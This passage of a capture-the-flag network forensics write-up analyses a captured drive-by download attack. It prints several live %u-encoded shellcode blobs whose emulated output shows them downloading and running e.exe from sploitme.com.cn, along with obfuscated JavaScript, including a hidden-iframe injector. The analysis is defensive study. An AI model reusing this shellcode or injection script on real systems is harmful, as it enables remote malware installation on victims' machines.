<style>td{line-height:.8em;}.gac_m td{line-height:17px;}form{margin-bottom:20px;}body,td,a,p,.h{font-family:arial,sans-serif}.h{color:#36c;font-size:20px}.q{color:#00c}.ts td{padding:0}.ts{border-collapse:collapse}em{font-weight:bold;font-style:normal}.lst{font:17px arial,sans-serif;margin-bottom:.2em;vertical-align:bottom;}input{font-family:inherit}.lsb,.gac_sb{font-size:15px;height:1.85em!important;margin:.2em;overflow:visible;padding:0 20px;}#gbar{float:left;height:22px}.gbh,.gbd{border-top:1px solid #c9d7f1;font-size:1px}.gbh{height:0;position:absolute;top:24px;width:100%}#gbs,.gbm{background:#fff;left:0;position:absolute;text-align:left;visibility:hidden;z-index:1000}.gbm{border:1px solid;border-color:#c9d7f1 #36c #36c #a2bae7;z-index:1001}#guser{padding-bottom:7px !important;text-align:right}#gbar,#guser{font-size:13px;padding-top:1px !important}.gb1{margin-right:.5em}.gb1,.gb3{zoom:1}.gb2{display:block;padding:.2em .5em}.gb2,.gb3{text-decoration:none}a.gb1,a.gb2,a.gb3,a.gb4{color:#00c !important}a.gb2:hover{background:#36c;color:#fff !important}
</style>

<script>
google.y={};
google.x=function(e,g){google.y[e.id]=[e,g];
return false};

if(!window.google)window.google={};

window.google.crm={};
window.google.cri=0;
window.clk=function(d,e,f,j,k,l,m){
	if(document.images){
		var a=encodeURIComponent||escape,b=new Image,g=window.google.cri++;
		window.google.crm[g]=b;
		b.onerror=(b.onload=(b.onabort=function(){
			delete window.google.crm[g]
		}));
		b.src=["/url?sa=T","",e?"&oi="+a(e):"",f?"&cad="+a(f):"","&ct=",a(j||"res"),"&cd=",a(k),d?"&url="+a(d.replace(/#.*/,"")).replace(/\+/g,"%2B"):"","&ei=","mHdoS-C7Ms2a-Abs68j-CA",l].join("")}
	return true
};
window.gbar={qs:function(){},tg:function(e){var o={id:'gbar'};for(i in e)o[i]=e[i];google.x(o,function(){gbar.tg(o)})}};</script></head><body bgcolor=#ffffff text=#000000 link=#0000cc vlink=#551a8b alink=#ff0000 onload="document.f.q.focus();if(document.images)new Image().src='/images/nav_logo7.png'" topmargin=3 marginheight=3><textarea id=csi style=display:none></textarea><div id=xjsc></div><div id=ghead><div id=gbar><nobr><b class=gb1>Web</b> <a href="http://images.google.fr/imghp?hl=fr&tab=wi" onclick=gbar.qs(this) class=gb1>Images</a> <a href="http://video.google.fr/?hl=fr&tab=wv" onclick=gbar.qs(this) class=gb1>Vid..os</a> <a href="http://maps.google.fr/maps?hl=fr&tab=wl" onclick=gbar.qs(this) class=gb1>Maps</a> <a href="http://news.google.fr/nwshp?hl=fr&tab=wn" onclick=gbar.qs(this) class=gb1>Actualit..s</a> <a href="http://books.google.fr/bkshp?hl=fr&tab=wp" onclick=gbar.qs(this) class=gb1>Livres</a> <a href="http://mail.google.com/mail/?hl=fr&tab=wm" class=gb1>Gmail</a> <a href="http://www.google.fr/intl/fr/options/" onclick="this.blur();gbar.tg(event);return !1" aria-haspopup=true class=gb3><u>plus</u> <small>&#9660;</small></a><div class=gbm id=gbi><a href="http://translate.google.fr/?hl=fr&tab=wT" onclick=gbar.qs(this) class=gb2>Traduction</a> <a href="http://blogsearch.google.fr/?hl=fr&tab=wb" onclick=gbar.qs(this) class=gb2>Blogs</a> <div class=gb2><div class=gbd></div></div><a href="http://www.youtube.com/?hl=fr&tab=w1&gl=FR" onclick=gbar.qs(this) class=gb2>YouTube</a> <a href="http://www.google.com/calendar/render?hl=fr&tab=wc" class=gb2>Agenda</a> <a href="http://picasaweb.google.fr/home?hl=fr&tab=wq" onclick=gbar.qs(this) class=gb2>Photos</a> <a href="http://docs.google.com/?hl=fr&tab=wo" class=gb2>Documents</a> <a href="http://www.google.fr/reader/view/?hl=fr&tab=wy" class=gb2>Reader</a> <a href="http://sites.google.com/?hl=fr&tab=w3" class=gb2>Sites</a> <a href="http://groups.google.fr/grphp?hl=fr&tab=wg" onclick=gbar.qs(this) class=gb2>Groupes</a> <div class=gb2><div class=gbd></div></div><a href="http://www.google.fr/intl/fr/options/" class=gb2>et encore plus &raquo;</a> </div></nobr></div><div id=guser width=100%><nobr><a href="/url?sa=p&pref=ig&pval=3&q=http://www.google.fr/ig%3Fhl%3Dfr%26source%3Diglk&usg=AFQjCNG3dQ3pMQCxA1EqhLnWIuH8E97qKg" class=gb4>iGoogle</a> | <a href="/preferences?hl=fr" class=gb4>Param..tres de recherche</a> | <a href="https://www.google.com/accounts/Login?hl=fr&continue=http://www.google.fr/" class=gb4>Connexion</a></nobr></div><div class=gbh style=left:0></div><div class=gbh style=right:0></div></div> <center><style>.pmoabs{position:absolute;right:0;top:25px;}.pmoflt,.pmoc{float:right;clear:both;}#pmocntr{behavior:url(#default#userdata);border:1px solid #ccc;}#pmocntr table{font-size:80%;}#pmolnk,#pmolnk div{background:url(/images/modules/buttons/g-button-chocobo-basic-1.gif)}#pmolnk{width:170px;}#pmolnk div{background-position:100% -400px;}#pmolnk div div{background-position:0 100%;}#pmolnk a{white-space:nowrap;background:url(/images/modules/buttons/g-button-chocobo-basic-2.gif) 100% 100% no-repeat;color:#fff;display:block;padding:8px 12px 15px 10px;text-decoration:none}.padi {padding:0 0 4px 8px}.padt {padding:0 6px 4px 6px}</style><div id=pmocntr class=pmoabs><table border=0><tr><td colspan=2><img border=0 src="/images/close_sm.gif" class=pmoc onclick="cpc()"><tr><td class=padi rowspan=2><img src="/images/chrome_48.gif"><td class=padt align=center><b>Surfez encore plus vite</b><tr><td class=padt align=center dir=ltr><div id=pmolnk><div><div><a href="/aclk?sa=L&ai=CS_ldf3FoS6LnGZP_-Qae1JWJB9u31oAB2ayWqAzv-_3lJxABIMFUUOjLsJYCYPsBqgReT9BpWddfOpzWEquRUKOQ7sQcVXB7ybEacZ5lX24Tm1ws4Fujt9WJ_Nk1_OyQFCZaebry-4Df3pSyRqI-Y8XixPOxOK2gGgqeETocTGxoW31pF4AfPs2mkPYCJ_7XhQ&num=1&sig=AGiWqtxUvV_Iaz3PGO8z61S_2VGLImCnWA&q=http://www.google.com/chrome/index.html%3Fhl%3Dfr%26brand%3DCHNG%26utm_source%3Dfr-hpp%26utm_medium%3Dhpp%26utm_campaign%3Dfr"><b>Installer Google Chrome</b></a></div></div></table></div><script>(function(){var b='pmocntr',a=document.getElementById(b),c='d',d='i',e;function p(){a.style.display='none'}try{a.load(b);e=a.getAttribute(d)||0;if(a.getAttribute(c)||e>25){p()}else{a.setAttribute(d,++e);a.save(b)}}catch(z){}window.cpc=function(){p();try{a.setAttribute(c,1);a.save(b)}catch(z){}};window.onresize=function(){if(a.offsetWidth*2+document.getElementById('logo').offsetWidth>document.body.clientWidth){a.className='pmoflt'}else{a.className='pmoabs'}};window.lol=function(){window.onresize()}}())</script><br clear=all id=lgpd><img alt="Google" height=110 src="/intl/fr_fr/images/logo.gif" width=276 id=logo onload="window.lol&&lol()"><br><br><form action="/search" name=f><table cellpadding=0 cellspacing=0><tr valign=top><td width=25%>&nbsp;</td><td align=center nowrap><input name=hl type=hidden value=fr><input name=source type=hidden value=hp><input autocomplete="off" maxlength=2048 name=q size=55 class=lst title="Recherche Google" value=""><br><input name=btnG type=submit value="Recherche Google" class=lsb><input name=btnI type=submit value="J&#39;ai de la chance" class=lsb></td><td nowrap width=25% align=left><font size=-2>&nbsp;&nbsp;<a href="/advanced_search?hl=fr">Recherche avanc..e</a><br>&nbsp;&nbsp;<a href="/language_tools?hl=fr">Outils linguistiques</a></font></td></tr><tr><td align=center colspan=3><font size=-1><span style="text-align:left">Rechercher dans : <input id=all type=radio name=meta value="" checked><label for=all> Web </label> <input id=lgr type=radio name=meta value="lr=lang_fr"><label for=lgr> Pages francophones </label> <input id=cty type=radio name=meta value="cr=countryFR"><label for=cty> Pages : France </label> </span></font></td></tr></table></form><br><span id=footer><center id=fctr><br><font size=-1><a href="/intl/fr/ads/">Programmes de publicit..</a> - <a href="/services/">Solutions d'entreprise</a> - <a href="/intl/fr/about.html">.. propos de Google</a> - <a href="http://www.google.com/ncr">Google.com in English</a><p id=shf0 style=display:none;behavior:url(#default#homePage)><font size=-1><a href="/aclk?sa=L&ai=CAVCOf3FoS6LnGZP_-Qae1JWJB8X4n3zX25rHCs2tk5cREAEgwVRQvpyhyfj_____AWD7AaoEXk_QaVnXXzqc1hKrkVCjkO7EHFVwe8mxGnGeZV9uE5tcLOBbo7fVifzZNfzskBQmWnm68vuA396UskaiPmPF4sTzsTitoBoKnhE6HExsaFt9aReAHz7NppD2Aif-14U&num=1&sig=AGiWqty0yyn1h1qel3QGGXXWe-9-P9wUjA&q=/mgyhp.html" onclick=xz()>Faire de Google ma page d'accueil</a></p><script>(function(){var a=document.getElementById("shf0"),b="http://www.google.fr/";try{a.isHomePage(b)||(a.style.display="block")}catch(z){}window.xz=function(){try{a.setHomePage(b);var c=new Image;c.src="/gen_204?mgmhp=shf0&ct=c&cd="+a.isHomePage(b);window.wy=c}catch(z){}}})();</script></font><p><font size=-2>&copy;2010 - <a href="/intl/fr/privacy.html">Confidentialit..</a></font></p></center></span> <div id=xjsd></div><div id=xjsi><script>if(google.y)google.y.first=[];if(google.y)google.y.first=[];google.dstr=[];google.rein=[];window.setTimeout(function(){var a=document.createElement("script");a.src="/extern_js/f/CgJmchICZnIrMAo4V0AdLCswDjgLLCswFjgXLCswFzgFLCswGDgFLCswGTgTLCswJTjKiAEsKzAmOAksKzAnOAQsKzA8OAIsKzBFOAEs/9-w08417YwM.js";(document.getElementById("xjsd")||document.body).appendChild(a);if(google.timers&&google.timers.load.t)google.timers.load.t.xjsls=(new Date).getTime();},0);
;google.neegg=1;google.y.first.push(function(){google.ac.b=true;google.ac.i(document.f,document.f.q,'','')});if(google.j&&google.j.en&&google.j.xi){window.setTimeout(google.j.xi,0);google.fade=null;}</script></div><script>(function(){
function a(){google.timers.load.t.ol=(new Date).getTime();google.report&&google.timers.load.t.xjs&&google.report(google.timers.load,google.kCSI)}if(window.addEventListener)window.addEventListener("load",a,false);else if(window.attachEvent)window.attachEvent("onload",a);google.timers.load.t.prt=(new Date).getTime();
})();
</script>
```

	- There's only this JavaScript from the rest of the packets.


<u>Code breakdown</u>:
```c

```




### Extracting the Shellcode on `aolwinamp()` function:

Here's the shellcode:
```c
%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u333D
```


Command 1:
```c
C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>scdbg.exe /f aolwinamp-shellcode
```

Output:
![](/assets/img/Pasted image 20240809134730.png)

Functions found in the shellcode analysis:
```c
401086  GetTempPathA(len=88, buf=12fd80) = 22
4010b0  LoadLibraryA(urlmon.dll)
4010ca  URLDownloadToFileA(http://sploitme.com.cn/fg/load.php?e=3ÿ888ÿ888ÿ888ÿ888ÿ888ÿ888, C:\Users\husky\AppData\Local\Temp\e.exe)
4010d7  WinExec(C:\Users\husky\AppData\Local\Temp\e.exe)
4010e0  ExitThread(0)
```


DLL dependencies:
Command->
```c
scdbg.exe /dllmap aolwinamp-shellcode
```

![](/assets/img/Pasted image 20240809143549.png)

List of DLLs:
```c
kernel32 Dll mapped at 7c800000 - 7c8f6000  Version: 5.1.2600.5781
ntdll    Dll mapped at 7c900000 - 7c9b2000  Version: 5.1.2600.5755
ws2_32   Dll mapped at 71ab0000 - 71ac7000  Version: 5.1.2600.5512
iphlpapi Dll mapped at 76d60000 - 76d79000  Version: 5.1.2600.5512
user32   Dll mapped at 7e410000 - 7e4a1000  Version: 5.1.2600.5512
shell32  Dll mapped at 7c9c0000 - 7d1d7000  Version: 6.0.2900.6018
msvcrt   Dll mapped at 77c10000 - 77c68000  Version: 7.0.2600.5512
urlmon   Dll mapped at 78130000 - 78258000  Version: 7.0.6000.17096
wininet  Dll mapped at 3d930000 - 3da01000  Version: 7.0.6000.17093
shlwapi  Dll mapped at 77f60000 - 77fd6000  Version: 6.0.2900.5912
advapi32 Dll mapped at 77dd0000 - 77e6b000  Version: 5.1.2600.5755
shdocvw  Dll mapped at 7e290000 - 7e401000  Version: 6.0.2900.5512
psapi    Dll mapped at 76bf0000 - 76bfb000  Version: 5.1.2600.5512
imagehlp Dll mapped at 76c90000 - 76cb9000  Version: 5.1.2600.6479
winhttp  Dll mapped at 4d4f0000 - 4d549000  Version: 5.1.2600.6175
```


### Extracting the Shellcode on `directshow()` function:

Here's the shellcode:
```c
%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u343D
```


Command 2:
```c
C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>scdbg.exe /f directshow-shellcode
```


Output:
![](/assets/img/Pasted image 20240809135552.png)


Functions found in the shellcode analysis:
```c
401086  GetTempPathA(len=88, buf=12fd80) = 22
4010b0  LoadLibraryA(urlmon.dll)
4010ca  URLDownloadToFileA(http://sploitme.com.cn/fg/load.php?e=4ⁿ♀, C:\Users\husky\AppData\Local\Temp\e.exe)
4010d7  WinExec(C:\Users\husky\AppData\Local\Temp\e.exe)
4010e0  ExitThread(0)
```


DLL dependencies:
Command->
```c
scdbg.exe /dllmap directshow-shellcode
```

![](/assets/img/Pasted image 20240809143808.png)

List of DLLs:
```c
kernel32 Dll mapped at 7c800000 - 7c8f6000  Version: 5.1.2600.5781
ntdll    Dll mapped at 7c900000 - 7c9b2000  Version: 5.1.2600.5755
ws2_32   Dll mapped at 71ab0000 - 71ac7000  Version: 5.1.2600.5512
iphlpapi Dll mapped at 76d60000 - 76d79000  Version: 5.1.2600.5512
user32   Dll mapped at 7e410000 - 7e4a1000  Version: 5.1.2600.5512
shell32  Dll mapped at 7c9c0000 - 7d1d7000  Version: 6.0.2900.6018
msvcrt   Dll mapped at 77c10000 - 77c68000  Version: 7.0.2600.5512
urlmon   Dll mapped at 78130000 - 78258000  Version: 7.0.6000.17096
wininet  Dll mapped at 3d930000 - 3da01000  Version: 7.0.6000.17093
shlwapi  Dll mapped at 77f60000 - 77fd6000  Version: 6.0.2900.5912
advapi32 Dll mapped at 77dd0000 - 77e6b000  Version: 5.1.2600.5755
shdocvw  Dll mapped at 7e290000 - 7e401000  Version: 6.0.2900.5512
psapi    Dll mapped at 76bf0000 - 76bfb000  Version: 5.1.2600.5512
imagehlp Dll mapped at 76c90000 - 76cb9000  Version: 5.1.2600.6479
winhttp  Dll mapped at 4d4f0000 - 4d549000  Version: 5.1.2600.6175
```




### Extracting the Shellcode on `com()` function:


Here's the shellcode:
```c
%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u373D
```


Command 3:
```c
C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>scdbg.exe /f com-shellcode
```


Output:
![](/assets/img/Pasted image 20240809140110.png)


Functions found in the shellcode analysis:
```c
401086  GetTempPathA(len=88, buf=12fd80) = 22
4010b0  LoadLibraryA(urlmon.dll)
4010ca  URLDownloadToFileA(http://sploitme.com.cn/fg/load.php?e=7, C:\Users\husky\AppData\Local\Temp\e.exe)
4010d7  WinExec(C:\Users\husky\AppData\Local\Temp\e.exe)
4010e0  ExitThread(0)
```


DLL dependencies:
Command->
```c
scdbg.exe /dllmap com-shellcode
```

![](/assets/img/Pasted image 20240809144211.png)

List of DLLs:
```c
kernel32 Dll mapped at 7c800000 - 7c8f6000  Version: 5.1.2600.5781
ntdll    Dll mapped at 7c900000 - 7c9b2000  Version: 5.1.2600.5755
ws2_32   Dll mapped at 71ab0000 - 71ac7000  Version: 5.1.2600.5512
iphlpapi Dll mapped at 76d60000 - 76d79000  Version: 5.1.2600.5512
user32   Dll mapped at 7e410000 - 7e4a1000  Version: 5.1.2600.5512
shell32  Dll mapped at 7c9c0000 - 7d1d7000  Version: 6.0.2900.6018
msvcrt   Dll mapped at 77c10000 - 77c68000  Version: 7.0.2600.5512
urlmon   Dll mapped at 78130000 - 78258000  Version: 7.0.6000.17096
wininet  Dll mapped at 3d930000 - 3da01000  Version: 7.0.6000.17093
shlwapi  Dll mapped at 77f60000 - 77fd6000  Version: 6.0.2900.5912
advapi32 Dll mapped at 77dd0000 - 77e6b000  Version: 5.1.2600.5755
shdocvw  Dll mapped at 7e290000 - 7e401000  Version: 6.0.2900.5512
psapi    Dll mapped at 76bf0000 - 76bfb000  Version: 5.1.2600.5512
imagehlp Dll mapped at 76c90000 - 76cb9000  Version: 5.1.2600.6479
winhttp  Dll mapped at 4d4f0000 - 4d549000  Version: 5.1.2600.6175
```


### Extracting the Shellcode on `spreadsheet()` function:

Here's the shellcode:
```c
%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u383D
```


Command 4:
```c
C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>scdbg.exe /f spreadsheet-shellcode
```


Output:
![](/assets/img/Pasted image 20240809143335.png)


Functions found in the shellcode analysis:
```c
401086  GetTempPathA(len=88, buf=12fd80) = 22
4010b0  LoadLibraryA(urlmon.dll)
4010ca  URLDownloadToFileA(http://sploitme.com.cn/fg/load.php?e=8╘╘╘╘╘╘╘╘╘♂╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘D╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘╘P╘╘P╘╘╘P╘╘ö╘╘, C:\Users\husky\AppData\Local\Temp\e.exe)
4010d7  WinExec(C:\Users\husky\AppData\Local\Temp\e.exe)
4010e0  ExitThread(0)
```


DLL dependencies:
Command->
```c
scdbg.exe /dllmap com-shellcode
```

![](/assets/img/Pasted image 20240809144313.png)

List of DLLs:
```c
kernel32 Dll mapped at 7c800000 - 7c8f6000  Version: 5.1.2600.5781
ntdll    Dll mapped at 7c900000 - 7c9b2000  Version: 5.1.2600.5755
ws2_32   Dll mapped at 71ab0000 - 71ac7000  Version: 5.1.2600.5512
iphlpapi Dll mapped at 76d60000 - 76d79000  Version: 5.1.2600.5512
user32   Dll mapped at 7e410000 - 7e4a1000  Version: 5.1.2600.5512
shell32  Dll mapped at 7c9c0000 - 7d1d7000  Version: 6.0.2900.6018
msvcrt   Dll mapped at 77c10000 - 77c68000  Version: 7.0.2600.5512
urlmon   Dll mapped at 78130000 - 78258000  Version: 7.0.6000.17096
wininet  Dll mapped at 3d930000 - 3da01000  Version: 7.0.6000.17093
shlwapi  Dll mapped at 77f60000 - 77fd6000  Version: 6.0.2900.5912
advapi32 Dll mapped at 77dd0000 - 77e6b000  Version: 5.1.2600.5755
shdocvw  Dll mapped at 7e290000 - 7e401000  Version: 6.0.2900.5512
psapi    Dll mapped at 76bf0000 - 76bfb000  Version: 5.1.2600.5512
imagehlp Dll mapped at 76c90000 - 76cb9000  Version: 5.1.2600.6479
winhttp  Dll mapped at 4d4f0000 - 4d549000  Version: 5.1.2600.6175
```


### Finding other possible malicious JavaScript: Found one at `packet 714`

Command:
```c
type jscode4.js | js-ascii.exe -e "document.output('D')" -
```

Output:
![](/assets/img/Pasted image 20240809152658.png)

JavaScript code:
```c
function Complete(){setTimeout('location.href = "about:blank',2000);}
function CheckIP(){var req=null;try{req=new ActiveXObject("Msxml2.XMLHTTP");}catch(e){try{req=new ActiveXObject("Microsoft.XMLHTTP");}catch(e){try{req=new XMLHttpRequest();}catch(e){}}}
if(req==null)return"0";req.open("GET","/fg/show.php?get_ajax=1&r="+Math.random(),false);req.send(null);if(req.responseText=="1"){return true;}else{return false;}}
Complete();
```

	- Similar to packet 178


### Missed malicious JavaScript code at `packet 28`

![](/assets/img/Pasted image 20240809162154.png)


<u>JavaScript code</u>:
```c
<script type="text/javascript">

eval(function(p,a,c,k,e,r){
	e=function(c){
		return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))
	};
	if(!''.replace(/^/,String)){
		while(c--)
			r[e(c)]=k[c]||e(c);
		k=[function(e){return r[e]}];
		e=function(){return'\\w+'};
		c=1
	};
	while(c--)
		if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);
	return p
}
('q.r(s("%h%0%6%d%e%7%1%8%9%d%3%4%a%5%2%2%i%j%b%b%9%i%c%k%0%2%7%1%l%3%k%7%l%3%m%b%t%3%c%0%3%u%4%v%6%1%f%w%e%x%f%y%6%a%z%0%g%2%5%4%n%8%5%1%0%A%5%2%4%n%8%9%2%o%c%1%4%a%B%0%9%0%f%0%c%0%2%o%j%8%5%0%g%g%1%m%a%p%h%b%0%6%d%e%7%1%p%C"));',39,39,'69|65|74|63|3D|68|66|6D|20|73|22|2F|6C|72|61|62|64|3C|70|3A|6F|2E|6E|31|79|3E|document|write|unescape|3F|6B|33|35|36|32|77|67|76|0A'.split('|'),0,{}));

</script>
```


Possible shellcode: (`pckt28-shellcode`)
```c
%h%0%6%d%e%7%1%8%9%d%3%4%a%5%2%2%i%j%b%b%9%i%c%k%0%2%7%1%l%3%k%7%l%3%m%b%t%3%c%0%3%u%4%v%6%1%f%w%e%x%f%y%6%a%z%0%g%2%5%4%n%8%5%1%0%A%5%2%4%n%8%9%2%o%c%1%4%a%B%0%9%0%f%0%c%0%2%o%j%8%5%0%g%g%1%m%a%p%h%b%0%6%d%e%7%1%p%C
```

Command 5:
```c
C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>scdbg.exe /f pckt28-shellcode
```

Output:
![](/assets/img/Pasted image 20240809162654.png)

	- Its not a shellcode.
	- I think this is for setting up the variable needed for the exploit?


### Found another script at packet `256` but not a malicious one

![](/assets/img/Pasted image 20240809163947.png)


### Possible malicious JS script found at `Packet 415`

Wireshark Stream:
![](/assets/img/Pasted image 20240809165318.png)

JS code:
```c
<script type="text/javascript">
var s="=jgsbnf!tsd>#iuuq;00tqmpjunf/dpn/do0@dmjdl>95d1:1ce97#!xjeui>2!ifjhiu>2!tuzmf>#wjtjcjmjuz;!ijeefo#?=0jgsbnf?";
m="";
for(i=0;i<s.length;i++){
	if(s.charCodeAt(i)==28){
		m+="&";
	} else if(s.charCodeAt(i)==23) {
		m+= "!";
	} else { 
		m+=String.fromCharCode(s.charCodeAt(i)-1);
	}
}
document.write(m);
</script>
```


-> Answer: `CVE-2005-2127`


----

## `Q8` What is the name of the executable being served via `'http://sploitme.com.cn/fg/load.php?e=8'` ?

Using Wireshark:
![](/assets/img/Pasted image 20240808233849.png)

	- There's nothing


There isn't any either using `NetworkMiner`:
![](/assets/img/Pasted image 20240808233943.png)


It's not in `Brim` either:
![](/assets/img/Pasted image 20240808234110.png)


Since there wasn't anything with the URI containing "`e=8`", let's check on all URI containing "`s=`"

Wireshark Query:
```c
http.request.uri contains "s="
```

![](/assets/img/Pasted image 20240808234333.png)

Following the stream:
![](/assets/img/Pasted image 20240808234446.png)

	- Is there some way for us to decode this obfuscated Javascript code?


Another blob of obfuscated Javascript code:
![](/assets/img/Pasted image 20240808234707.png)

- See "***Extracting the Shellcode on `spreadsheet()` function***" from the above question.

-> Answer: `e.exe`

## `Q9` One of the malicious files was first submitted for analysis on VirusTotal at `2010-02-17 11:02:35` and has an MD5 hash ending with '`78873f791`'. Provide the full MD5 hash.

Powershell script created to extract MD5 hashes from reconstructed files from NetworkMiner: (Located at `C:\Users\husky\Documents` from PMAT VM)
```c
param(
    [string]$DirectoryPath,
    [string]$OutputFilePath
)

# Ensure that the directory path is valid
if (-not (Test-Path -Path $DirectoryPath -PathType Container)) {
    Write-Host "The specified directory does not exist."
    exit
}

# Ensure the output file path is valid
$OutputFileDirectory = [System.IO.Path]::GetDirectoryName($OutputFilePath)
if (-not (Test-Path -Path $OutputFileDirectory -PathType Container)) {
    Write-Host "The directory for the output file does not exist."
    exit
}

# Function to compute Md5 hash
function Get-FileMD5{
    param(
        [string]$FilePath
    )
    try{
        $hashAlgorithm = [System.Security.Cryptography.MD5]::Create()
        $fileStream = [System.IO.File]::OpenRead($FilePath)
        $hashBytes = $hashAlgorithm.ComputeHash($fileStream)
        $fileStream.Close();
        
        # Convert hash bytes to a hex string
        $hashString = [BitConverter]::ToString($hashBytes) -replace '-'
        return $hashString
    } catch {
        Write-Host "Error computing hash for file: $FilePath"
        return $null
    }
}

# Collect file hashes
$fileHashes = @()

Get-ChildItem -Path $DirectoryPath -File | ForEach-Object {
    $filePath = $_.FullName
    $md5Hash = Get-FileMD5 -FilePath $filePath
    if ($md5Hash) {
        $fileHashes += "$filePath : $md5Hash"
    }
}

# Write the results to the output file

$fileHashes | Out-File -FilePath $OutputFilePath -Encoding utf8

Write-Host "MD5 hashes have been written to $OutputFilePath"
```

How to execute PowerShell script:
```c
PS C:\Users\husky\Documents> ./files-md5-hash.ps1 -DirectoryPath "C:\Users\husky\Desktop\NetworkMiner_2-9\AssembledFiles\192.168.56.52\TCP-80\fg" -OutputFilePath ./md5hashes.txt
MD5 hashes have been written to ./md5hashes.txt
```

Output:
![](/assets/img/Pasted image 20240809173444.png)

VirusTotal Link:
```c
virustotal.com/gui/file/<sha256>
```

	- Just look up using the MD5 hash!


-> Answer: `52312BB96CE72F230F0350E78873F791`

